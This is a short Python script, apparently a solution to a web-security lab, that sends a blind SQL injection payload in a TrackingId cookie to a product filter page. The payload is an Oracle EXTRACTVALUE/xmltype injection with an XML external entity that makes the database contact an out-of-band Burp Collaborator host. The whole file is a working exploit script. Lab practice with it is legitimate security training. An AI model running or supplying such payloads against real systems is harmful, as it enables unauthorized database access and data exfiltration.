import requests
import re

host = "YOUR_HOST"
path = "/filter?category=Pets"
payload="""'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--"""
cookies={
    "session":"YOUR_SESSION",
    "TrackingId": "x"+payload
}

res=requests.get("https://"+host+path,cookies=cookies)
print(res.status_code)
print(res.elapsed.total_seconds())
print(res.text)